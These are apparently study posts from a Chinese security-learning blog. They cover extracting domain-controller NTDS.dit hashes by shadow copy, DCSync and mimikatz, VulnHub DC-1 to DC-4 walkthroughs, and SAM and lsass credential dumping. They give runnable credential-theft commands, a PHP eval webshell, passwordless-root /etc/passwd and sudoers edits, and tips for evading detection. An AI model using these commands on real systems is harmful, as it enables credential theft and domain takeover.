{"posts":[{"title":"内网学习-域控账号密码抓取","content":"内网学习-域控账号密码抓取 域控账号密码文件NTDS介绍 NTDS.DIT为DC的数据库，内容有域用户、域组、用户hash等信息，域控上的ntds.dit只有可以 登录到域控的用户（如域管用户、DC本地管理员用户）可以访问,为了进一步保护密码哈希值， 使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。 位置：C:\\Windows\\NTDS 如果要读取该文件的内容有以下的几种方式： 1、离线读取，将NTDS文件复制到攻击者的本地，然后使用工具读取 问题：可能内存太大 传输过程很容易丢失 或者被杀软干掉 或者网络g了 前提控制下域控 2、在线读取，通过给域控的电脑上传读取的工具，进行在线读取 弊端：工具需要免杀 前提控制下域控 3、远程读取，不需要上线域控，可以通过Dcsync远程读取 通过域内主机读取 走协议dcsync 使用卷影拷贝提取域控NTDS 从Windows XP SP2和Windows Server 2003开始，微软就向Windows操作系统中引入了一项名叫卷 影拷贝的服务（Volume Shadow Copy Service-VSS）。 这种服务允许Windows系统以自动或手动 的方式对文件或磁盘卷宗的当前状态进行备份（或快照），需要注意的是，在这个过程中，即使 文件处于打开状态下该服务仍然可以直接进行文件备份， **Ntds.dit是默认被Windows系统锁定的，**想要读取该文件就要利用卷影拷贝服务(Volume Shadow Copy Service，VSS)，得到Ntds.dit文件的副本。 卷影拷贝服务(VSS)本质上是属于快照技术的一种， 主要用于备份和恢复，即使目标文件被处于锁定状态。 关卷影拷贝的方式有很多，我们介绍几种常用的 一、ntdsutil.exe工具进行拷贝 工具介绍：ntdsutil.exe是一个为活动目录提供管理机制的命令行工具，该工具默认安装在 域控服务器上，可以在域控制器上直接操作，2003、2008、2012、2016等，提取NTDS过 程分为3步 我们先在本地进行测试 1、第一步：创建一个NTDS快照 命令： ntdsutil.exe snapshot &quot;activate instance ntds&quot; create q Local Destination 2、第二步：加载快照到磁盘中 命令： ntdsutil.exe snapshot &quot;mount {bf50c558-aa39-414d-9cc2-32e6dd3aebdc}&quot; q q 3、第三步：复制快照中的ntds.dit文件 命令：copy '快照地址\\Windows\\NTDS\\ntds.dit' 目标地址 copy C:$SNAP_202209221446_VOLUMEC$\\Windows\\NTDS\\ntds.dit C:\\Users\\Administrator\\Desktop\\ntds\\ntds.dit 复制到桌面 4、第四步：删除快照 命令： ntdsutil.exe snapshot &quot;umount {bf50c558-aa39-414d-9cc2- 32e6dd3aebdc}&quot; 取消挂载 &quot;delete {bf50c558-aa39-414d-9cc2-32e6dd3aebdc}&quot; q q 删除快照 不然容易被发现 在CS上进行测试 1、第一步：创建一个NTDS快照（这里使用的administrator会出现如下的提示，我们可以 使用令牌将权限切换到system，或者借用administrator创建计划任务，但是计划任务比较麻烦需要多个任务 创建生成复制） 命令： ntdsutil.exe snapshot &quot;activate instance ntds&quot; create q q 提到system 2、第二步：加载快照到磁盘中 命令： ntdsutil.exe snapshot &quot;mount {4c864d7c-1cff-4a91-9da0-fbefdaf6498e}&quot; q q 可以看到快照的地址为C:$SNAP_202306171721_VOLUMEC$\\ 3、第三步：复制快照中的ntds.dit文件 命令：copy '快照地址\\Windows\\NTDS\\ntds.dit' 目标地址 copy C:$SNAP_202209221446_VOLUMEC$\\Windows\\NTDS\\ntds.dit C:\\Users\\Administrator\\Desktop\\ntds.dit 4、第四步：删除快照 命令：ntdsutil.exe snapshot &quot;umount {4c864d7c-1cff-4a91-9da0-fbefdaf6498e}&quot; &quot;delete {4c864d7c-1cff-4a91-9da0-fbefdaf6498e}&quot; q q 使用卷影拷贝提取域控NTDS(中) 二、通过vssadmin工具进行拷贝 vssadmin是Windows Server 2008及Windows 7系统以上提供的VSS管理工具，它可以用于 创建或删除卷影副本，列出卷影副本的信息，他需要两步就可以进行提取NTDS文件 我们先在本地进行测试 1、第一步：创建一个C盘快照 命令： vssadmin create shadow /for=c: 2、第二步：将快照中的NTDS文件进行复制出来 命令： copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\NTDS\\ ntds.dit C:\\Users\\Administrator\\Desktop\\ntds.dit 我们CS进行测试 1、第一步：创建一个C盘快照 命令： vssadmin create shadow /for=c: 2、第二步：将快照中的NTDS文件进行复制出来 命令： copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\NTDS\\ ntds.dit C:\\Users\\Administrator\\Desktop\\ntds.dit 最后一步就是删除快照 命令： vssadmin delete shadows /for=c: /quiet 第三、IFM方式进行拷贝 可以通过创建一个 IFM 的方式获取 ntds.dit，在使用 ntdsutil 创建媒体安装集（IFM）时， 需要进行生成快照、加载、将 ntds.dit 和计算机的 SAM 文件复制到目标文件夹中等操作 1、 ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot; q q 此时 ntds.dit 将被保存在 C:\\test\\Active Directory 下，SYSTEN 和 SECURITY 两个 文件将被保存在 C:\\test\\registry 文件夹下 cs上同理 需要system权限 使用卷影拷贝提取域控NTDS(下） 第四、vssown提取ntds.dit vssown 是一个 vbs 脚本,可以创建和删除卷影副本,使用方式如下 1、启动卷影复制服务 命令： cscript vssown.vbs /start 2、创建一个C盘的卷影副本 命令： cscript vssown.vbs /create c 3、列出当前卷影副本 命令：cscript vssown.vbs /list 4、复制文件到指定的目录 命令：copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\windows\\NTDS\\ntds.dit C:\\Users\\Administrator\\Desktop\\ntds.dit 5、删除卷影副本 命令：cscript vssown.vbs /delete {B267559B-57D8-4D59-B77F-890CF57BA448} 第五、Copy-VSS.ps1 PS脚本可以直接导出 Import-Module .\\Copy-VSS.ps1 Copy-VSS 不想上传到受害机也可以直接在cs上导入使用 在cs的目录下然后powershell-import Copy-VSS.ps1 powershell Copy-VSS 直接导出 第六、 Invoke-NinjaCopy Invoke-NinjaCopy也是PS脚本可以直接导出NTDS和system文件 命令： Import-Module -name .\\Invoke-NinjaCopy.ps1 Invoke-NinjaCopy -Path &quot;c:\\windows\\ntds\\ntds.dit&quot; -LocalDestination &quot;c:\\ntds.dit&quot; Invoke-NinjaCopy -Path &quot;C:\\Windows\\System32\\config\\SYSTEM&quot; -LocalDestination &quot;c:\\system.hiv&quot; 离线读取NTDS文件中的Hash值 离线一般需要两步： 1、将远端域控的ntds.dit下载到本地， 2、然后利用再在本地进行。 注意：因为 system.hive 里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容 命令如下：reg save hklm\\system c:\\windows\\temp\\system.hive 接下来我们读取里面的内容这里介绍几种方式，选择一个顺手的就行 第一种、secretsdump.exe 工具读取 命令：secretsdump.exe -system system.hive -ntds ntds.dit LOCAL 第二种、NTDSDumpEx.exe工具读取 命令： NTDSDumpEx -d ntds.dit -s system -o 1.txt 只有账户hash没有机器用户hash 第三种、esedbexport工具读取 1、esedbexport是linux下的工具，先要在自己的linux机器上安装（centos）建议在python2环境下运行 下载工具包（我已经提供） ./configure make make install ldconfig 2、 提取ntds文件内容 esedbexport -m tables ntds.dit 3、安装 ntdsxtract工具 命令： 下载工具 python setup.py build python setup.py install 注意：如果提示 Import Error: No module named Crypto. Hash，请执行pip install pycryptodome 4、将 ntds.dit. Export 和 SYSTEM 文件放入到 esedbexport工具的文件夹中，然后导出哈希值，最后 的结果将保存在 txt 里 命令： 1、python dsusers.py datatable.4 link_table.7 output --syshive system.hive --passwordhashes -- pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee 1.txt 读取用户信息 2、python dscomputers.py datatable.4 computer_output --csvoutfile 2.csv 读取机器信息 第四种、DS Internals工具读取 本工具是PS脚本，使用命令如下： 1、安装DS Internals Install-Module DSInternals -Force安装方式（5.0版本） Import-Module .\\DSInternals 导入方式（4.0版本） 2、导出 hash，并保存在 txt 文件里 $key = Get-Bootkey -SystemHivePath 'system.hiv' Get-ADDBAccount -All -DBPath 'ntds.dit' -Bootkey $key | Out-File 1.txt 在线读取NTDS文件Hash值 在线的方式就是直接读取，不需要在导出ntds文件到自己的电脑中，直接用工具就可以读 取在线读取需要考虑几个问题： 1、工具是否被杀软杀掉 2、如果域太大读取时间太久容易死机 介绍几个方式在线读取 第一种:使用MimiKatz 命令: lsadump::dcsync /domain:abc.com /all /csv(读取所有) 命令: lsadump::dcsync /domain:abc.com /all /csv(读取所有) 第二种:QuarksPWDump工具 命令: Quarks PW Dump.exe --dump-hash-domain --ntds-file ntds.dit Ntds这个文件必须先要导出来 一些拷贝卷影 的方法把他拷贝出来 第三种:secretsdump工具 命令: secretsdump.exe 域名/administrator:密码@IP -outfile f9f.txt 远程读取的 第四种: Invoke-DCSync.ps1工具 命令:他是一个PS工具 Import-Module .\\Invoke-DCSync.ps1 Invoke-DCSync Dcsync原理以及攻击 什么是Dcsync（domain Controller synchronization ）域控同步:在内网中一般不是一个域控， 会有域树或者域森林等，域控之间是要同步数据的,不同的域控15分钟之间要发起一次数据同 步的请求，请求里面就包含同步的数据，这里采用的协议是DRS(目录复制服务)，这个就是 DCsync 要运行这个DRS服务，需要什么用户才能运行呢？ Administrators组内的用户 Domain Admins组内的用户 Enterprise Admins组内的用户 域控制器的计算机帐户 域控的Administrator 和 system 也可以 使用可你加密存储密码是dcsync攻击的利用条件 Dcsync攻击： 2015 年 8 月，发布了新版本的 Mimikatz，新增加了 DCSync 功能。该功能可以 模仿一个域控制器，从真实的域控制器中请求数据，例如用户的哈希。该功能最 大的特点就是不用登陆域控制器，即可远程通过域数据同步复制的方式获得域控 制器上的的数据。 关于Dcsync的利用思路 1、找到有权限的用户，从而远程读取域控用户信息，可以进行PTH 黄金 白银票据攻击 2、如果控制了域控，可以在域控添加一个管理员账号从而进行权限维持 3、可以添加一个普通的用户，修改ACL从而实现可以使用Dcsync，进行权限维持 利用Dcsync远程读取域控Hash 远程读取是利用dcsync，前提是必须找到拥有运行dcsync的账号，所以读取hash 的步骤是两步 1、找到拥有dcsync的用户 2、远程读取即可 读取方式一： 1、mimikatz 命令: lsadump::dcsync /domain:abc.com /all /csv(读取所有) lsadump::dcsync /domain:abc.com /user:administrator（读取单个用户） 读取方式二： 第三种:secretsdump工具 命令: secretsdump.exe 域名/用户名或者hash:密码@IP 利用Dcsync远程读取明文账号 利用DCSync可以获取明文凭据，这是因为账户勾选了&quot;使用可逆加密存储密码的属性 ","link":"https://f9f.fun/post/nei-wang-xue-xi-yu-kong-zhang-hao-mi-ma-zhua-qu/"},{"title":"每周靶机渗透记录-DC4","content":"DC4 信息收集 1.找靶机ip 2.扫端口 3.扫目录 没扫出啥可能字典问题 4.访问80端口 尝试了一下弱口令失败了 直接burp爆破 用的kali里面自带的john.lst 看长度得出密码为happy 账号也是看页面猜的admin 抓包 5.存在命令执行漏洞 尝试写入木马 写不进去文件 失败了 发现jim sam 用的shell也是bash和root一样 可以用hydra爆破密码 ssh远程链接 6.反弹shell 找到jim路径 在路径下发现一个bak文件 复制到自己桌面文件里然后hydra爆破ssh密码 jibril04 找到一封邮件 嗨，Jim， 我今天结束要去度假，所以老板让我把密码给你，以防出现问题。 密码为：^xHhA&amp;hvim0y 再见， 查尔斯 Charles 账户密码 尝试jim用户提权 不行 转Charles 小写charles 提权一 发现teehee免密root权限密码 利用teehee的root权限在passwd中写入一个免密的root权限用户 echo &quot;fwl::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd 提权二 利用teehee往sudoers里写入charles ALL=(ALL:ALL) ALL 让charles用户可以无密码执行sudo echo &quot;charles ALL=(ALL:ALL) ALL&quot; | sudo teehee -a /etc/sudoers sudoer配置文件错误提权 有的时候，普通用户经常要执行某个命令，但是经常需要sudo输入密码，我们就可以通过配置/etc/sudoers文件来实现普通用户某个命令权限的提升。但是如果一旦是给了用户写入root权限的命令，比如vi，那么这个普通用户一旦被入侵，就可以通过vi来提权 解释一下payload中的参数， 如： root：代表用户 第一个ALL：之网络中的主机，我也不知道什么意思，但是这个all还是不动好了 第二个(ALL:ALL)：指以谁的身份去执行，root就行了 第三个ALL：指所有的命令，可以自己制定，比如/bin/ls,/bin/nc 看一下例子：代表用户zaq可以以root的权限运行ls指令 前边要加sudo，可以看到zaq用户成功查看了/root目录的结构 sudo -l 显示出自己（执行 sudo 的使用者）的权限 所以我们可以使用payload，让charles用户用sudo无密码执行各种命令，实现权限的提升。 总结 提权部分参考百度 ","link":"https://f9f.fun/post/mei-zhou-ba-ji-shen-tou-ji-lu-dc4/"},{"title":"每周靶机渗透记录-DC3","content":"vulnhubDC-3 1.信息收集 确定目标ip192.168.131.137 This time, there is only one flag, one entry point and no clues. To get the flag, you'll obviously have to gain root privileges. How you get to be root is up to you - and, obviously, the system. Good luck - and I hope you enjoy this little challenge. 😃 这一次，只有一面旗帜，一个入口，没有线索。 要获得该标志，显然必须获得根权限。 如何成为根取决于你自己，当然也取决于系统。 祝你好运——我希望你喜欢这个小挑战。：-） 扫描端口 nmap -sV -sC -A -p- 192.168.131.137 whatweb探测站点信息 whatweb -v 193.168.131.137 好像没啥用问题不大 敏感目录扫描 nikto -host 192.168.131.137 发现/administrator/index.php 访问 joomla cms 漏洞查找和利用 perl joomscan.pl --url 192.168.131.137 版本号 后台地址 msf搜对应版本漏洞 存在sql注入漏洞 选一个字典复制 cp /usr/share/exploitdb/exploits/php/webapps/42033.txt f9f.txt sqlmap跑 直接用上面语句 在原来语句把dbs改为current-dbs 爆出 现在dbs -D &quot;joomladb&quot; --tables 爆出库里的表 -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns 找到user表 爆出表里列 接下里都打印出来就行了-D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;email,id,params,username,name,password&quot; --dump 密码加密了直接john爆破 snoopy 登入后台成功 后台发现上传点 上传一句话木马 蚁剑链接成功 但是权限不是root需要提权 lsb_release -a 获取到版本号 ubuntu 16.04 继续msf搜索系统版本的提权漏洞 访问网站下载 解压 文件 下载该文件 tar -xvf exploit.tar 解压 蚁剑上无法成功用冰蝎 先上穿冰蝎马 成功 提权成功 到root目录找到唯一flag ","link":"https://f9f.fun/post/mei-zhou-ba-ji-shen-tou-ji-lu-dc3/"},{"title":"每周靶机渗透记录-DC2","content":"每周靶机渗透DC-2 环境配置 在官网下载dc-2 压缩包 解压后用VM打开 打开后将网络适配器那里改为 NAT模式 信息收集 1.找到被攻击靶机ip 排除已知几个 剩下 192.168.131.133位靶机ip其中192.168.131.128是我另一台kali的ip 2.先去访问 这个ip 找有用信息 这里访问失败 先放着 3.nmap 或者 fscan等其他工具扫描ip 看有无可利用的端口 nmap -sC -sV -A -p- 192.168.131.133 -p- 是扫描该ip下所有端口 这里可以发现 ssh端口被改为 7744端口 通常位22 还可以发现 该网页CMS是WordPress 这里可以联想到wpscan 4.回到网页 发现网址栏 变成了 http://dc-2/ 而非 http://192.168.131.133 可以联想应该是靶机做了设置会把ip强制转换为域名导致DNS解析不到ip地址 这时候我们需要在 host文件里自己加上这个域名对应的ip地址 vim /etc/hosts :wq 保存退出 这时候我们在kali的浏览器上访问ip 在页面找到第一个flag Flag Flag 1: Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl. More passwords is always better, but sometimes you just can’t win them all. Log in as one to see the next flag. If you can’t find it, log in as another. 大概意思是我们常规的字典是不行的 需要cewl爆破密码 登入去找另外一个flag 所以我们要找登入界面 5.目录遍历找登入页面 用dirsearch 扫描ip python3 dirsearch.py -u 192.168.131.133 -e* 找到了登入界面并且发现了网站信息泄露 前面知道网站CMS时WordPress 所以可以用wpscan扫描其用户 再用cewl爆破出密码 就可以登录 6.wpscan 第一次扫描失败 没有 api值 后来翻qiang搞到api 还是不行 一看别人wp 才知道我的wpscan语句错了 先给正确的 wpscan --url dc-2 -e u 我的是 wpscan --api-token sGfbxq5WAbbXalQLs6L7DYavL1mjxapDhrZC0weE8zo --url http://dc-2/wp-login.php?redirect_to=http%3A%2F%2F192.168.131.133%2Fwp-admin%2F&amp;reauth=1 -e u 错误在我扫的url错了 url 应该就是那个ip所定向的网址 dc-2 发现用户有三个 分别是 admin jerry tom 接下来用cewl 生成密码字典 同理也是 扫dc-2 cewl dc-2 -w wordlist.txt 在同目录下创建user.txt 并把wpscan扫出的用户名输入进去 然后爆破 出用户名对应密码 wpscan --url dc-2 -U user.txt -P wordlist.txt [SUCCESS] - jerry / adipiscing [SUCCESS] - tom / parturient 可以看到两个用户 和他的密码被爆破成功 7.直接去登录他页面找信息 登入jerry用户看到在page索引下看到flag2 Flag 2 Edit &quot;Flag 2&quot; Flag 2: If you can’t exploit WordPress and take a shortcut, there is another way. Hope you found another entry point. 如果不能通过WordPress走捷径 你需要找到另一个切入点 8.通过网页上传shell 我先想到网页里有很多种上传方式 我试着上传php文件 但是失败了 尝试写入一句话木马也是不行 想到一开始nmap扫到7744端口 可能可以ssh连接 9.ssh连接 用tom连接成功 目录下可以看到flag3.txt 但是无法用cat读取 遇到知识盲区了 上网查发现这里用的rbash限制 需要绕过 绕过rbash BASH_CMDS[a]=/bin/sh;a /bin/bash 添加环境变量 export PATH=PATH:/bin/exportPATH=PATH:/bin/ export PATH=PATH:/bin/exportPATH=PATH:/usr/bin Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. 可怜的老汤姆总是追着杰里跑。也许他应该为他造成的所有压力负责。 没理解啥意思 就继续按常规套路往下做 10.cat /etc/passwd 我想变交互式 但不行 那直接 cat /etc/passwd 爆出里面有jerry 那就联想到 Perhaps he should su for all the stress he causes. su jerry flag3可能先提到jerry的意思吗 果然 但是要密码 前面ssh时web密码是错的 但我这里还是不知道密码只能试试之前的web密码 adipiscing 成功... 找到第四个flag Good to see that you've made it this far - but you're not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - you're on your own now. 😃 Go on - git outta here!!!! 这里很明显看到git 然后还有一个flag 肯定是要提到root权限才能拿到的 11.提权 提权先想到 找二进制文件 find / -perm -4000 2&gt;/dev/null 都用不上 这时候sudo -l 看看有没有jerry可以用的一些root级别命令 发现了git 和前面提示对上 git提权 sudo git help config 输入该命令会强制进入交互状态 在调用 bash !/bin/bash 成功提权 / / /\\ \\ ___| | | | | ___ _ __ ___ / \\ / / / _ \\ | | / ` |/ _ | ' \\ / _ / / \\ /\\ / / | | | (| | () | | | | /_/ / / _||| _,|_/|| ||_/ Congratulatons!!! A special thanks to all those who sent me tweets and provided me with feedback - it's all greatly appreciated. If you enjoyed this CTF, send me a tweet via @DCAU7. 总结 这个靶机用到了wpscan爆破用户和配合密码本爆破密码 还有cewl密码本生成 还有一开始重定向失败 无法访问靶机地址 DNS解析失败 需要vim /etc/hosts 定向ip到域名 还有rbash绕过 第一次遇到 利用vi绕过rbash vi :set shell=/bin/bash :shell export PATH=/bin:/usr/bin:$PATH 利用BASH_CMDS绕过rbash BASH_CMDS[A]=/bin/bash A export PATH=/bin:/usr/bin:$PATH ","link":"https://f9f.fun/post/mei-zhou-ba-ji-shen-tou-ji-lu-dc2/"},{"title":"每周靶机渗透记录-DC1","content":"每周靶机渗透之DC-1 环境搭建 DC-1靶机下载： 官网地址：https://www.vulnhub.com/entry/dc-1,292/ 靶机安装 我这里是直接用VM打开dc1.ova文件 信息收集 老样子先找靶机IP 在kali上输入命令arp-scan -l 我这里开了两个靶机环境 排除掉我知道的剩下的那个 192.168.131.130就是dc1靶机地址 访问 地址 看到登入界面 先尝试弱口令（不行） 万能密码（不行） 先放着 用nmap扫端口继续收集有用信息 nmap -sC -A -sV 192.168.131.130 80端口这里可以发现很多有用信息 访问robots.txt 这里用到一个插件 直接得到网页是基于Drupal7 的框架下用 php语言编写搭建的 这里因为得到了网页框架版本 直接kali searchsploit命令去搜这个框架的漏洞 searchsploit Drupal 7.x 这个框架下有很多漏洞 我们这里用最后一个 远程代码执行漏洞 接下来要利用漏洞 我先更新一下 自己kali上的msf库 msfdb init 漏洞利用 用第七个漏洞 直接使用该漏洞模块 用info查看该漏洞相关信息 设置目标地址 192.168.131.130 然后输入run命令 进入shell环境 ls cat flag1.txt 得到第一个flag Every good CMS needs a config file - and so do you. 每个好的CMS都需要一个配置文件——你也一样。 根据提示直接找配置文件 在这之前先将shell变成可交互环境 用python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' 反弹一个完整的shell环境 然后就是一个个目录去翻 最终在 sites default settings.php 文件里找到flag2 flag2 Brute force and dictionary attacks aren't the only ways to gain access (and you WILL need access). What can you do with these credentials? *暴力攻击和字典攻击不是 *只有获得访问权限的方法(并且你将需要访问权限)。 *你能用这些证书做什么? 这里还有mysql 数据库的用户名密码 连接数据库 mysql -udbuser -pR0ck3t; 连接成功后看 我们网页drupal 用的数据表 select * from users; 找用户 这里admin 用户密码加密了 破解不了 我们这里采取直接改密码 因为密码是哈希加密过的 我们的密码也要是加密过 先退到网站目录下 然后生成哈希加密过的密码 我这里是fwl123 然后再连接数据库 再用update命令更新密码 更新后回到网页登入 admin fwl123 登入成功 得到flag3 Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow. 特殊的PERMS将帮助查找passwd -但您需要-exec该命令来弄清楚如何获得阴影中的内容。 根据flag3提示 cat /etc/shadow 权限不够 cat /etc/passwd 发现flag4在/home 目录下 且还有/bin/bash 联想到ssh连接 22端口 但是密码不知道 我这里直接hydra爆破 hydra -l flag4 -P /usr/share/john/password.lst 192.168.131.130 ssh -vV -f 其中-l表示指定爆破的用户，-P表示指定使用哪个密码字典，ip为DC1的ip，利用ssh协议做爆破 爆破成功 用户名flag4 密码 orange ssh连接成功 ls 发现flag4.txt Can you use this same method to find or access the flag in root? 您可以使用相同的方法来查找或访问根目录中的标志吗? 根据提示，我们需要拿到root用户的权限，才能得到最终的flag 提权 在这里我们使用suid提权 关于suid提权 可以看这篇文章 Linux提权之SUID提权_linux 添加suid_反余弦函数的博客-CSDN博客 find / -perm -4000 2&gt;/dev/null 发现_find_具有root权限。直接执行命令提权 find -exec /bin/sh ; 到root目录下找到最后一个flag Well done!!!! Hopefully you've enjoyed this and learned some new skills. You can let me know what you thought of this little journey by contacting me via Twitter - @DCAU7 做得好! ! 希望你喜欢这篇文章，并学到了一些新技能。 你可以让我知道你对这次小旅行的看法 通过推特@DCAU7联系我 总结 做了很久 有很多不知道的地方 也是靠着百度一点一点做得 ","link":"https://f9f.fun/post/mei-zhou-ba-ji-shen-tou-ji-lu-dc1/"},{"title":"每周靶机渗透记录","content":"每周靶机渗透记录 环境配置 dnh发的靶机 直接在vm上打开 一开始 kali搜不到它的ip 改了一下配置就可以了 信息收集 先判断出靶机的ip地址 192.168.131.132 访问ip 接下来nmap扫端口 看有没有可以利用的端口 发现 21端口 80端口打开 21端口可以用ftp协议 但不知道用户密码 暂时用不上 80端口访问发现 暂时不知道什么用 不过知道了他的版本号 Apache HTTP Server 2.4.18 接下来扫目录 这里用dirsearch扫 这里看到敏感目录 /.backup 直接去访问 $servername = &quot;localhost&quot;; $database = &quot;jangow01&quot;; $username = &quot;jangow01&quot;; $password = &quot;abygurl69&quot;; ftp连接 我这里连接成功有问题没回显了 我换一台kali 成功了 然后就看看有没有可以用的信息 发现 php文件 html文件 cat看看 直接cat不行 先get 到本地上 发现是一句话 可以利用这个上传一句话木马 这里这个注入点之前其实就发现了 但没太注意 右上有个buscar点进去就是刚才那样 直接在该目录下写入一句话木马 echo '&lt;?php eval($_POST[&quot;a&quot;]); ?&gt;' &gt;shell.php 可以看到上传成功 连接蚁剑成功 上传了冰蝎马 连接冰蝎 漏洞利用 然后uname -a 看版本号 lsb_release -a 得到版本号 ubuntu 16.04 然后去msf搜这个系统版本可以利用漏洞 searchsploit ubuntu 16.04 cp /usr/share/exploitdb/exploits/linux/local/45010.c 桌面/shell2.c 然后直接通过冰蝎上传 本想在冰蝎上直接执行这个发现冰蝎不行 那就监听去执行 上传了反弹shell发现一直监听不到 上网查了 才知道 反弹shell不是直接就这么用的 反弹shell 要先确定被攻击靶机哪个端口是可以开放监听的 以下参考网上 反弹 shell 的建立 1. 将 kali 所有端口绑定在同一个端口中 sudo iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 1234 然后我们使用 nc 对 1234 这个端口实行监听 nc -lnvp 1234 2. 编写 shell 检测哪些端口可用并上传 bash for i in{1..65535}; do timeout 1 nc -vz 192.168.16.128 $i &amp;&amp; echo &quot;$i open&quot; &gt;&gt; out.txt || echo &quot;$i closed&quot; &gt;&gt; out.txt; done 然后我们即可上传该文件，文件名为 text_shell.bash 文件 3. 利用任意命令执行漏洞去执行上传的 bash 在进行这一步之前，确保 kali 的 ip 和 bash 一致，并且 kali 已经把所有端口绑定在同一个端口上；而且 nc 是正在监听中 这里我们既可以在哥斯拉里面执行 bash，也可以通过这个 url 里面进行传参，bash text_shell.bash 去执行 shell 文件 需要注意的一点是：我们上传 bash 文件之后，不一定能够执行，还需要我们去添加执行权限 chmod +x text_shell.bash 4. 发现 443 可以用来作为反弹 shell 5. 建立反弹 shell kali (192.168.16.128) 监听本地的 1234 端口 我这里也是成功监听 然后就是去执行之前上传的提权漏洞文件 在这之前可以先输入python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'变交互式 进入 html 下的 site 目录 执行a.out 最后 whoami 发现是root 提权成功 直接去root 目录 总结 这个靶机一开始做得很顺利以为挺简单的 后面监听不到 学到了反弹shell完整使用方法还有msf漏洞查到很多个具体使用哪个漏洞 和为什么选择这个漏洞还不太了解 ","link":"https://f9f.fun/post/mei-zhou-ba-ji-shen-tou-ji-lu/"},{"title":"内网学习day10","content":"内网学习day10 密码抓取技术 内网密码抓取技术概述 内网密码抓取技术在内网渗透中非常非常非常的重要，账号密码决定后续是否可以进行横向， 在内网渗透中有一个很重要的思路 抓取密码--&gt; 横向移动--&gt;抓取密码--&gt;横向移动 那么有哪些密码使我们关注的点呢？ 1、本地账号密码（或者hash） 2、域账号密码（或者hash） 3、RDP账号密码 4、浏览器账号密码 5、数据库账号密码 6、本地保存账号密码文件 Mimikatz等众多系统密码抓取工具介绍 读取电脑系统的账号密码或者Hash值的工具非常的多，我们介绍几个 1、getpassword 打开GetPass工具所在的目录。打开命令行环境。运行64位程GetPassword。运行该程 序后,即可获得明文密码 2、pwdump7 在命令行环境中运行PwDump7程序,可以得到系统中所有账户的NTLMHash 3、QuarksPwDump 在命令行环境中输人QuarksPwDump.exe --dump-hash-local导出三个用户的NLMHash 4、GET-PASSHashes.ps1 5、mimikatz Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，但由于其功能强大，能够 直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具， mimikatz可以从内存中提取明文密码、哈希、PIN 码和 kerberos 票证。 mimikatz 还可以执行 哈希传递、票证传递或构建黄金票证 项目地址https://github.com/gentilkiwi/mimikatz/ 常用模块和命令如下： 常用命令： privilege::debug sekurlsa::msv 6、Invoke-Mimikatz.ps1 7、CS自带工具 8、MSF工具 电脑系统抓取密码的原理 本地认证的意思就是，我们的电脑上存储着自己的账号密码，无论电脑是否联网，只 要能开机，就可以输入账号密码登录到电脑中，工作组就是采用本地认证 那么认证流程是什么样子呢？简单流程如下 Windows Logon Process（即winlogon.exe）：是Windows NT 用户登陆程序，用于管理用户登陆和退出.用 户注销、重启、锁屏后，操作系统会让winlogon.exe显示登陆界面 lsass.exe是一个系统进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策 略 SAM文件是位于C\\windows\\system32\\config\\目录下的，用于储存本地所有用户的凭证信息，但 是这并不代表着你可以随意去查看系统密码 在线读取SAM文件中的Hash值 在线读取的意思就是，我们通过工具上传到目标的机器然后再直接读取机器 上的SAM文件中的内容，这里我们主要读取的NTLN-HASH值，有几个弊端 1、上传的工具可能会被杀软杀掉 2、工具因为网络问题传输可能不完整 方法一：使用mimikatz上传工具到目标机器读取 使用mimikatz在线读取Sam文件 分开的命令如下 privilege::debug token::elevate lsadump::sam 连起来 mimikatz.exe “privilege::debug” “token::elevate” “lsadump::sam” exit 方法二：使用CS自带的工具导出 使用mimikatz在线读取Sam文件 离线读取SAM文件中的Hash值 离线读取的意思就是，我们不需要再本地读取，可以将SAM文件复制到我们自己的电脑上 然后使用工具读取，这里我们主要读取的NTLN-HASH值 离线读取再一定程度上可以躲避杀软 通过工具或者命令导出SAM文件 1、通过reg命令导出 reg save hklm\\sam sam.hive reg save hklm\\system system.hive 2、使用PS（Copy-VSS）脚本 powershell-import Copy-VSS.ps1 （导入） powershell Copy-VSS 把脚本导进cs里 然后把sam文件下载到本地 名字要改成sam.hive system.hive 下载过来名字变了 两个读出来是一样的 在线读取lsass进程内存密码 在线读取的意思就是，我们通过工具上传到目标的机器然后再直接读取机器上lsass内 存中的明文账号密码，这里我们主要读取的是明文 弊端 1、上传的工具可能会被杀软杀掉 privilege::debug sekurlsa::msv 获取HASH (LM,NTLM) sekurlsa::wdigest 通过可逆的方式去内存中读取明文密码 sekurlsa::Kerberos 获取域管理员的明文密码 sekurlsa::tspkg 通过tspkg读取明文密码 sekurlsa::livessp 通过livessp 读取明文 sekurlsa::ssp 通过ssp 读取明文密 sekurlsa::logonPasswords 通过以上各种方法读取明文密码 低版本电脑可以读取到，高版本一般默认不会在内存中存明文密码 离线读取lsass进程内存密码 离线读取的意思就是，我们不需要再本地读取，可以将lsass内存导出，在本地读取器 上lsass内存中的明文账号密码，这里我们主要读取的是明文 离线读取再一定程度上可以躲避杀软 导出方式一 使用任务管理器导出 导出方式二 使用procdump 导出lsass.dmp文件, ProcDump 是一个命令行实用工具，其主要用途 是在管理员或开发人员可用于确定峰值原因的峰值期间监视 CPU 峰值和生成故障转 储的应用程序,微软的一般不会被杀软杀掉 命令：procdump.exe -accepteula -ma lsass.exe lsass.dm 导出方式三 使用powershell的Out-MiniDump.ps1脚本 命令： powershell-import Out-MiniDump.ps1 powershell Get-Process lsass | 